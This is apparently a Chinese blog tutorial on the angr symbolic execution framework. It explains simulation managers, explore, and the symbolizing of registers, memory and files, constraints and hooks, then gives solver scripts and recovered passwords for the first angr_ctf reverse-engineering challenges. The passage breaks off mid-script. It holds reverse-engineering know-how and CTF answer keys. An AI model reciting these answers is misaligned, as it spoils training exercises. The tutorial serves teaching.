save_unconstrained，则被认定为不受约束的 state 会放在这，不受约束的 state 是指由用户数据或符号控制的指令指针（例如eip）</td></tr><tr><td>unsat</td><td>如果创建SM时启用了save_unsat，则被认为不可满足的 state 会放在这里</td></tr></tbody></table><p>simgr 类的方法：</p><ul><li><p>使用 move() 转移state，将 fulter_func 筛选出来的 state 从 from_stash 转移到 to_stash</p><p><code>state.posix.dumps(0)</code>：到达当前状态对应的程序输入</p><p><code>state.posix.dumps(1)</code>：到达当前状态对应的程序输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#从 'deadended' 状态堆栈中，筛选出那些标准输出中包含字符串 '100' 的状态，并将这些状态移动到 'more_then_50' 状态堆栈中，匿名函数的参数是 s</span>simgr<span class="token punctuation">.</span>move<span class="token punctuation">(</span>from_stash<span class="token operator">=</span><span class="token string">'deadended'</span><span class="token punctuation">,</span> to_stash<span class="token operator">=</span><span class="token string">'more_then_50'</span><span class="token punctuation">,</span> filter_func<span class="token operator">=</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> <span class="token string">'100'</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>使用 step() 方法使处于 active 的 state 执行一个基本块，不会改变 state 本身</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">simgr<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="explorer"><a href="#explorer" class="headerlink" title="explorer"></a>explorer</h4><p>用于探索模拟状态直到找到特定条件满足的状态的方法，有 <strong>find</strong>（目标指令的地址或地址列表） 和 <strong>avoid</strong>（避免的指令地址或地址列表） 两种参数，找到符合的 find 状态会保存在 <strong>simger.found</strong> 列表中，可遍历元素获取状态</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'path_to_binary'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span>find_address <span class="token operator">=</span> <span class="token number">0x4017c0</span>avoid_address <span class="token operator">=</span> <span class="token number">0x401230</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>find_address<span class="token punctuation">,</span> avoid<span class="token operator">=</span>avoid_address<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>   <span class="token comment">#打印出符号条件的状态的输入    </span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><ul><li><code>solver.eval(expression)</code> 将会解出一个可行解</li><li><code>solver.eval_one(expression)</code>将会给出一个表达式的可行解，若有多个可行解，则抛出异常。</li><li><code>solver.eval_upto(expression, n)</code>将会给出最多n个可行解，如果不足n个就给出所有的可行解。</li><li><code>solver.eval_exact(expression, n)</code>将会给出n个可行解，如果解的个数不等于n个，将会抛出异常。</li><li><code>solver.min(expression)</code>将会给出最小可行解</li><li><code>solver.max(expression)</code>将会给出最大可行解</li></ul><h4 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h4><p>符号执行就是<u>给程序传递一个符号而不是具体的值</u></p><p>遇到分支时 angr 会保存所有分支以及分支后的所有分支，在分支时保存进入该分支时的判断条件，通常判断条件是对符号的约束</p><p>当 angr 运行到目标状态可以调用求解器对一路上收集到的约束求解，最终得到某个符号能够到达当前状态的值</p><p><img src="/angr%E5%AD%A6%E4%B9%A0%E4%B8%8Eangr-CTF%E9%A2%98%E8%A7%A3%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/3031561-20221129171743462-301356444.png" alt="img"></p><p><img src="/angr%E5%AD%A6%E4%B9%A0%E4%B8%8Eangr-CTF%E9%A2%98%E8%A7%A3%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/3031561-20221128133848616-99279409.png" alt="img"></p><p>angr 的 state 属性都是状态插件，包括 memory 、regs 、 men 、registers 、solver等，用于控制仿真程序看到的环境，包括如何从环境中引入符号数据</p><h5 id="寄存器符号化"><a href="#寄存器符号化" class="headerlink" title="寄存器符号化"></a>寄存器符号化</h5><p>跳过输入定位到输入之后，直接改变寄存器，将 state 传入 simgr，<code>solution_state.solver.eval(arg1)</code>获取得到的值，可控制多个寄存器</p><p>位向量：BVV(value, size)BVS(name, size)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'file_path'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start<span class="token punctuation">)</span><span class="token comment">#创建位向量</span>passwd <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'passwd'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> passwdsimgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="栈中的值符号化"><a href="#栈中的值符号化" class="headerlink" title="栈中的值符号化"></a>栈中的值符号化</h5><p>通过计算构造，例如 arg1 -&gt; <u>ebp - 0xc</u>; arg2 -&gt; <u>ebp - 0x10</u></p><p>则构造esp &#x3D; ebp， esp - 0x8， 两个参数入栈（stack_push）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">initial_state_regs<span class="token punctuation">.</span>ebp <span class="token operator">=</span> initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esparg1 <span class="token operator">=</span> charipy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> charipy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>esp <span class="token operator">-=</span> <span class="token number">8</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>stack_push<span class="token punctuation">(</span>arg2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="内存符号化"><a href="#内存符号化" class="headerlink" title="内存符号化"></a>内存符号化</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>passwd0_address<span class="token punctuation">,</span> passwd0<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以字节类型输出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="动态内存符号化"><a href="#动态内存符号化" class="headerlink" title="动态内存符号化"></a>动态内存符号化</h5><p>由于 angr 并没有真正 运行 二进制文件而只是在模拟运行状态，因此它实际上不需要将内存分配到堆中，实际上可以伪造任何地址，所以将伪造的地址存放到 bss 段的地址中模拟题目的情况即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>pointer_to_malloc_memory_address0<span class="token punctuation">,</span> fake_heap_address0<span class="token punctuation">,</span> endness<span class="token operator">=</span>project<span class="token punctuation">.</span>arch<span class="token punctuation">.</span>memory_endness<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>endness 设置端序，可以直接 project.arch.memory_endness 获取程序端序</p><pre class="line-numbers language-none"><code class="language-none">LE – 小端序(little endian, least significant byte is stored at lowest address)BE – 大端序(big endian, most significant byte is stored at lowest address)ME – 中间序(Middle-endian. Yep.)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="文件内容符号化"><a href="#文件内容符号化" class="headerlink" title="文件内容符号化"></a>文件内容符号化</h5><p>仿真文件系统并插入文件，blank_state 从打开文件部分地址开始</p><p>symbolic_file_size_bytes 是文件中的内容长度，passwd_file 是实际读出的长度</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#形成符号化的文件格式</span>passwd_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token operator">=</span>passwd0<span class="token punctuation">,</span> size<span class="token operator">=</span>symbolic_file_size_bytes<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> passwd_file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="添加约束条件"><a href="#添加约束条件" class="headerlink" title="添加约束条件"></a>添加约束条件</h4><p>在实际的测试生产中符号执行技术存在约束求解问题和路径爆炸问题，当程序存在循环结构的时候即使是简单逻辑也可能产生规模巨大的执行路径导致路径爆炸，所以需要提供更多的约束控制路径爆炸问题</p><h5 id="约束求解"><a href="#约束求解" class="headerlink" title="约束求解"></a>约束求解</h5><p>用字符串直接比较约束取代循环判断函数， angr 提供加入约束条件的方法 <code>state.solver.add</code> ，将每个符号化的布尔值作为一个关于符号变量合法性的断言</p><p>示例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x <span class="token operator">-</span> y <span class="token operator">>=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>y <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token number">5</span><span class="token operator">>></span><span class="token operator">></span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用法：expolre 的 find 地址设置为比较函数的地址，load 的 size 设置为字符串长度，不需要 * 8</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#从地址中加载值</span>res <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token comment">#加入限制：加载值等于固定值</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'AUPDNNPROEZRJWKB'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h5><p>可以使用 hook 直接改写函数，hook engine 是 angr 使用的引擎 SimEngine 的子类，默认情况下用 SimProcedures 中的符号摘要替换库函数设置 hooking，可以通过 <code>angr.procedures</code> 或 <code>angr.SimProcedures</code> 查看列表</p><p>SimProcedure 就是 hook 机制，可以通过 <code>project.hook(addr, hook)</code> 设置，其中 hook 是一个 SimProcedure 实例，通过 <code>.is_hooked / .unhook / .hook_py</code> 进行管理，将 <code>project.hook(addr)</code> 作为函数装饰器可以编写自己的 hook 函数，还可以通过 <code>project.hook_symbol(name, hook)</code> hook 函数</p><p>用法：一参是需要 hook 的调用函数的地址，二参是调用函数 <code>call func</code> 到下一条指令之间的长度，函数参数是 state</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> @project<span class="token punctuation">.</span>hook<span class="token punctuation">(</span><span class="token number">0x1234</span><span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">def</span> <span class="token function">set_rax</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>返回值用 <code>claripy.BVV(value, size)</code> ，例如：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>            user_input_string <span class="token operator">==</span> check_against_string<span class="token punctuation">,</span>             claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">,</span>             claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span>        <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="利用函数名hook"><a href="#利用函数名hook" class="headerlink" title="利用函数名hook"></a>利用函数名hook</h5><p>在函数被多次调用的时候利用函数名 hook 而不需要使用函数调用地址</p><p>每个程序都有一个符号表，angr 可以使用 <code>Project.hook_symbol</code> 解析出每个导入符号的地址，用自己的代码替换函数</p><p>用法：<code>project.hook_symbol</code> 一参是函数名，二参是自定义的类，类参数是 <code>angr.SimProcedure</code>，类中定义 run 函数的一参是 self，其他参数可以直接用参数的参数，例如这里 check_equals_symbol 函数有参数 to_check 和 length，加载内存的 state 用 self.state，最后不需要设置 rax 直接 return 即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ReplacementCheckEquals</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> to_check<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>            user_input_buffer_address <span class="token operator">=</span> to_check            user_input_buffer_length <span class="token operator">=</span> length            user_input_string <span class="token operator">=</span> self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>                user_input_buffer_address<span class="token punctuation">,</span>                user_input_buffer_length            <span class="token punctuation">)</span>            check_against_string <span class="token operator">=</span> <span class="token string">'ORSDDWXHZURJRBDH'</span>            <span class="token keyword">return</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>                user_input_string <span class="token operator">==</span> check_against_string<span class="token punctuation">,</span>                 claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                 claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span>        check_equals_symbol <span class="token operator">=</span> <span class="token string">'check_equals_ORSDDWXHZURJRBDH'</span>    project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span>check_equals_symbol<span class="token punctuation">,</span> ReplacementCheckEquals<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="hook-scanf应对复杂输入"><a href="#hook-scanf应对复杂输入" class="headerlink" title="hook scanf应对复杂输入"></a>hook scanf应对复杂输入</h5><p>用法：调用带有全局状态的 globals 插件，保存对符号值的引用</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">func</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> format_string<span class="token punctuation">,</span> param0<span class="token punctuation">,</span> param1<span class="token punctuation">)</span><span class="token punctuation">:</span>        arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param0<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">,</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    stored_solutions <span class="token operator">=</span> solution_state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span>    scanf0_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    scanf1_solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>stored_solutions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf0_solution<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>scanf1_solution<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="angr-ctf-题解"><a href="#angr-ctf-题解" class="headerlink" title="angr_ctf 题解"></a>angr_ctf 题解</h2><p>项目地址：<a href="https://github.com/jakespringer/angr_ctf">https://github.com/jakespringer/angr_ctf</a></p><h3 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h3><p>目标地址是输出good job，输出能够到达目标地址的第一个输入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./00_angr_find'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span>find_address <span class="token operator">=</span> <span class="token number">0x8048675</span>avoid_address <span class="token operator">=</span> <span class="token number">0x8048666</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>find_address<span class="token punctuation">,</span> avoid<span class="token operator">=</span>avoid_address<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#JXWVXRKX</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h3><p>有很多分支会调用 avoid_me 函数，放到 avoid 参数里</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./01_angr_avoid'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span>find_address <span class="token operator">=</span> <span class="token number">0x80485E0</span>avoid_address <span class="token operator">=</span> <span class="token number">0x80485A8</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>find_address<span class="token punctuation">,</span> avoid<span class="token operator">=</span>avoid_address<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#HUJOZMYS</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h3><p>程序中出现多次 Try again 和 Good job，避免记录所有的 Good job地址，将对两种情况的判断写成函数作为 find 和 avoid 的参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./02_angr_find_condition'</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#HETOBRCU</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h3><p>本题使用 scanf 输入了三个十六进制数，angr 对 scanf 的复杂输入处理的不是很好，</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%x %x %x"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而输入后的参数会传递给寄存器 eax ebx edx</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:08048937                 mov     ecx, [ebp+var_18].text:0804893A                 mov     eax, ecx.text:0804893C                 mov     ecx, [ebp+var_14].text:0804893F                 mov     ebx, ecx.text:08048941                 mov     ecx, [ebp+var_10]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入函数返回后通过这三个寄存器传递给栈</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.text:0804897B                 call    get_user_input.text:08048980                 mov     [ebp+var_14], eax.text:08048983                 mov     [ebp+var_10], ebx.text:08048986                 mov     [ebp+var_C], edx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以可以将三个寄存器符号化注入，从传递寄存器参数给栈的位置开始执行，避开 scanf 输入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token 